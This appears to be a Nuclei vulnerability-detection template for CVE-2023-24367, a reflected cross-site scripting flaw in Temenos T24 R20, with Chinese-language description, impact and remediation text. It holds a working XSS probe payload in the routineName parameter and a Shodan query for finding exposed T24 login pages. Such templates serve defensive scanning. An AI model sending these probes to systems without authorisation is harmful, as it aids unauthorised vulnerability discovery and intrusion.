id: temenos-t24-xss

info:
  name: Temenos T24 R20 - 跨站脚本漏洞（CVE-2023-24367）
  author: r3Y3r53
  severity: medium
  description: |
    该模板用于检测 Temenos T24 R20 - 跨站脚本漏洞。该类漏洞通常源于页面将用户可控输入未经过滤或编码后写入响应，导致浏览器执行非预期脚本。模板会向 `/jsps/genrequest.jsp?routineName="><script>alert(document.domain)</script>` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可诱导用户访问恶意链接，在受害者浏览器中执行脚本。
    - 成功利用后可能窃取会话信息、篡改页面内容、发起越权操作，或作为进一步钓鱼与权限提升的攻击链环节。
  remediation: |
    - 对输出到 HTML、属性、JavaScript、URL 等不同上下文的数据分别进行安全编码。
    - 对输入参数进行白名单校验，并避免直接回显未经处理的用户输入。
    - 启用合适的 Content-Security-Policy，降低脚本注入后的利用效果。
  reference:
    - https://github.com/mrojz/T24/blob/main/CVE-2023-24367.md
    - https://github.com/mrojz/T24/blob/main/T24_XSS.md
    - https://nvd.nist.gov/vuln/detail/CVE-2023-24367
    - https://github.com/ARPSyndicate/cvemon
    - https://github.com/mrojz/T24
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    cpe: cpe:2.3:a:temenos:t24:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    shodan-query: title:"T24 Sign in"
    product: t24
    vendor: temenos
  tags: xss,temenos,vuln

http:
  - method: GET
    path:
      - '{{BaseURL}}/jsps/genrequest.jsp?routineName="><script>alert(document.domain)</script>'

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "<script>alert(document.domain)</script>"
          - "<title>Processing...</title>"
        condition: and

      - type: status
        status:
          - 200
